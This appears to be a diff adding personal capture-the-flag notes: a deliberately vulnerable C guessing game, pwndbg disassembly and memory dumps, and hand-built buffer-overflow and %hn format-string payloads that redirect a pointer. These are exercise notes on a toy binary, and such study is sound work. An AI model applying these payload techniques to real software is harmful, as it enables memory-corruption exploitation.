@@ -1,0 +1,259 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+struct GuessNum {
+    void (*check) (struct GuessNum *);
+    char real[128];
+    char guess[128];
+    char *winMsg;
+};
+
+void check(struct GuessNum *gn) {
+  if (atoi(gn->real) != atoi(gn->guess))
+    return;
+  printf(gn->winMsg);
+}
+
+void vuln() {
+  struct GuessNum gn = {
+    .winMsg = "Good Job.\n",
+    .check = check
+  };
+
+  sprintf(gn.real, "%d", rand());
+  scanf("%s", gn.guess);
+
+  gn.check(&gn);
+}
+
+void clear(char *x[])
+{
+  int i;
+  int j;
+  for (i = 0; x[i]; i++) {
+    for (j = 0; x[i][j]; j++)
+      x[i][j] = 0;
+  }
+}
+
+int main(int argc, char *argv[], char *envp[])
+{
+  clear(argv);
+  clear(envp);
+
+  srand(1);
+
+  vuln();
+  return 0;
+}
+
+
+
+===========================================
+
+Dump of assembler code for function check:
+   0x0804856b <+0>:	push   ebp
+   0x0804856c <+1>:	mov    ebp,esp
+   0x0804856e <+3>:	push   ebx
+   0x0804856f <+4>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048572 <+7>:	add    eax,0x4
+   0x08048575 <+10>:	push   eax
+   0x08048576 <+11>:	call   0x8048450 <atoi@plt>
+   0x0804857b <+16>:	add    esp,0x4
+   0x0804857e <+19>:	mov    ebx,eax
+   0x08048580 <+21>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048583 <+24>:	add    eax,0x84
+   0x08048588 <+29>:	push   eax
+   0x08048589 <+30>:	call   0x8048450 <atoi@plt>
+   0x0804858e <+35>:	add    esp,0x4
+   0x08048591 <+38>:	cmp    ebx,eax
+   0x08048593 <+40>:	jne    0x80485a9 <check+62>
+   0x08048595 <+42>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x08048598 <+45>:	mov    eax,DWORD PTR [eax+0x104]
+   0x0804859e <+51>:	push   eax
+   0x0804859f <+52>:	call   0x80483e0 <printf@plt>           
+   0x080485a4 <+57>:	add    esp,0x4
+   0x080485a7 <+60>:	jmp    0x80485aa <check+63>
+   0x080485a9 <+62>:	nop
+   0x080485aa <+63>:	mov    ebx,DWORD PTR [ebp-0x4]
+   0x080485ad <+66>:	leave
+   0x080485ae <+67>:	ret
+End of assembler dump.
+
+pwndbg> disassemble vuln
+Dump of assembler code for function vuln:
+   0x080485af <+0>:	push   ebp
+   0x080485b0 <+1>:	mov    ebp,esp
+   0x080485b2 <+3>:	push   edi
+   0x080485b3 <+4>:	sub    esp,0x10c
+   0x080485b9 <+10>:	mov    eax,gs:0x14
+   0x080485bf <+16>:	mov    DWORD PTR [ebp-0x8],eax
+   0x080485c2 <+19>:	xor    eax,eax
+   0x080485c4 <+21>:	lea    edx,[ebp-0x110]
+   0x080485ca <+27>:	mov    eax,0x0
+   0x080485cf <+32>:	mov    ecx,0x42
+   0x080485d4 <+37>:	mov    edi,edx
+   0x080485d6 <+39>:	rep stos DWORD PTR es:[edi],eax                 
+   0x080485d8 <+41>:	mov    DWORD PTR [ebp-0x110],0x804856b
+   0x080485e2 <+51>:	mov    DWORD PTR [ebp-0xc],0x8048770
+   0x080485e9 <+58>:	call   0x8048420 <rand@plt>
+   0x080485ee <+63>:	push   eax
+   0x080485ef <+64>:	push   0x804877b
+   0x080485f4 <+69>:	lea    eax,[ebp-0x110]
+   0x080485fa <+75>:	add    eax,0x4
+   0x080485fd <+78>:	push   eax
+   0x080485fe <+79>:	call   0x8048430 <sprintf@plt>
+   0x08048603 <+84>:	add    esp,0xc
+   0x08048606 <+87>:	lea    eax,[ebp-0x110]
+   0x0804860c <+93>:	add    eax,0x84
+   0x08048611 <+98>:	push   eax
+   0x08048612 <+99>:	push   0x804877e
+   0x08048617 <+104>:	call   0x8048440 <__isoc99_scanf@plt>            
+   0x0804861c <+109>:	add    esp,0x8
+   0x0804861f <+112>:	mov    eax,DWORD PTR [ebp-0x110]
+   0x08048625 <+118>:	lea    edx,[ebp-0x110]
+   0x0804862b <+124>:	push   edx
+   0x0804862c <+125>:	call   eax
+   0x0804862e <+127>:	add    esp,0x4
+   0x08048631 <+130>:	nop
+   0x08048632 <+131>:	mov    eax,DWORD PTR [ebp-0x8]
+   0x08048635 <+134>:	xor    eax,DWORD PTR gs:0x14
+   0x0804863c <+141>:	je     0x8048643 <vuln+148>
+   0x0804863e <+143>:	call   0x80483f0 <__stack_chk_fail@plt>
+   0x08048643 <+148>:	mov    edi,DWORD PTR [ebp-0x4]
+   0x08048646 <+151>:	leave
+   0x08048647 <+152>:	ret
+End of assembler dump.
+
+
+pwndbg> disassemble clear
+Dump of assembler code for function clear:
+   0x08048648 <+0>:	push   ebp
+   0x08048649 <+1>:	mov    ebp,esp
+   0x0804864b <+3>:	sub    esp,0x8
+   0x0804864e <+6>:	mov    DWORD PTR [ebp-0x8],0x0
+   0x08048655 <+13>:	jmp    0x804869e <clear+86>
+   0x08048657 <+15>:	mov    DWORD PTR [ebp-0x4],0x0
+   0x0804865e <+22>:	jmp    0x804867d <clear+53>
+   0x08048660 <+24>:	mov    eax,DWORD PTR [ebp-0x8]
+   0x08048663 <+27>:	lea    edx,[eax*4+0x0]
+   0x0804866a <+34>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x0804866d <+37>:	add    eax,edx
+   0x0804866f <+39>:	mov    edx,DWORD PTR [eax]
+   0x08048671 <+41>:	mov    eax,DWORD PTR [ebp-0x4]
+   0x08048674 <+44>:	add    eax,edx
+   0x08048676 <+46>:	mov    BYTE PTR [eax],0x0
+   0x08048679 <+49>:	add    DWORD PTR [ebp-0x4],0x1
+   0x0804867d <+53>:	mov    eax,DWORD PTR [ebp-0x8]
+   0x08048680 <+56>:	lea    edx,[eax*4+0x0]
+   0x08048687 <+63>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x0804868a <+66>:	add    eax,edx
+   0x0804868c <+68>:	mov    edx,DWORD PTR [eax]
+   0x0804868e <+70>:	mov    eax,DWORD PTR [ebp-0x4]
+   0x08048691 <+73>:	add    eax,edx
+   0x08048693 <+75>:	movzx  eax,BYTE PTR [eax]
+   0x08048696 <+78>:	test   al,al
+   0x08048698 <+80>:	jne    0x8048660 <clear+24>
+   0x0804869a <+82>:	add    DWORD PTR [ebp-0x8],0x1
+   0x0804869e <+86>:	mov    eax,DWORD PTR [ebp-0x8]
+   0x080486a1 <+89>:	lea    edx,[eax*4+0x0]
+   0x080486a8 <+96>:	mov    eax,DWORD PTR [ebp+0x8]
+   0x080486ab <+99>:	add    eax,edx
+   0x080486ad <+101>:	mov    eax,DWORD PTR [eax]
+   0x080486af <+103>:	test   eax,eax
+   0x080486b1 <+105>:	jne    0x8048657 <clear+15>
+   0x080486b3 <+107>:	nop
+   0x080486b4 <+108>:	leave
+   0x080486b5 <+109>:	ret
+End of assembler dump.
+
+
+
+pwndbg> disassemble main
+Dump of assembler code for function main:
+   0x080486b6 <+0>:	push   ebp
+   0x080486b7 <+1>:	mov    ebp,esp
+   0x080486b9 <+3>:	push   DWORD PTR [ebp+0xc]
+
+   0x080486bc <+6>:	call   0x8048648 <clear>
+   0x080486c1 <+11>:	add    esp,0x4
+
+   0x080486c4 <+14>:	push   DWORD PTR [ebp+0x10]
+   0x080486c7 <+17>:	call   0x8048648 <clear>
+   0x080486cc <+22>:	add    esp,0x4
+   0x080486cf <+25>:	push   0x1
+   0x080486d1 <+27>:	call   0x8048400 <srand@plt>
+   0x080486d6 <+32>:	add    esp,0x4
+   0x080486d9 <+35>:	call   0x80485af <vuln>
+   0x080486de <+40>:	mov    eax,0x0
+   0x080486e3 <+45>:	leave
+   0x080486e4 <+46>:	ret
+End of assembler dump.
+
+
+
+check  real:
+
+   0x804856f <check+4>     mov    eax, dword ptr [ebp + 8]
+   0x8048572 <check+7>     add    eax, 4
+   0x8048575 <check+10>    push   eax
+ ► 0x8048576 <check+11>    call   atoi@plt <0x8048450>
+        nptr: 0xffffc474 ◂— '1804289383'
+
+
+
+check guess
+
+
+   0x804857b <check+16>    add    esp, 4
+   0x804857e <check+19>    mov    ebx, eax
+   0x8048580 <check+21>    mov    eax, dword ptr [ebp + 8]
+   0x8048583 <check+24>    add    eax, 0x84
+   0x8048588 <check+29>    push   eax
+ ► 0x8048589 <check+30>    call   atoi@plt <0x8048450>
+        nptr: 0xffffc4f4 ◂— '1804289383'
+
+
+
+1804289383AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x8048770AAAAAAAAHHHHEEEE     ===130A        ebp =141--144   eax =129--132
+0x646f6f47
+
+ ► 0x804859f <check+52>    call   printf@plt <0x80483e0>
+        format: 0x8048770 ◂— 'Good Job.\n'
+        vararg: 0x0
+
+pwndbg> x 0x80483e0
+0x80483e0 <printf@plt>:	0xa00c25ff
+pwndbg> x 0x8048770
+0x8048770:	0x646f6f47
+
+
+pwndbg> x/10x 0x8048770
+0x8048770:	0x646f6f47	0x626f4a20 0x25000a2e===d00Gboj空格%NUL\.
+
+
+ 0xffffc45c
+ ESP  0xffffc45c —▸ 0x8048770 ◂— inc    edi /* 'Good Job.\n' */
+
+
+ 需要把0x08048770 写入0xffffc45c
+
+pwndbg> p/d 0x0804
+$1 = 2052
+pwndbg> p/d 0x4870
+$2 = 18544
+
+\x5c\xc4\xff\xff\x5e\xc4\xff\xff%2044c%3$hn%16492c%2$hn
+
+1804289383AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0$'\x5c\xc4\xff\xff\x5e\xc4\xff\xff%2044c%3$hn%16492c%2$hn'0AAAAAAAAHHHHEEEE
+
+
+===========================================================
+ ► 0x80485fe <vuln+79>     call   sprintf@plt <0x8048430>
+        s: 0xffffc474 ◂— 0x0
+        format: 0x804877b ◂— 0x25006425 /* '%d' */
+        vararg: 0x6b8b4567
+
+1804289383AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFHHHH
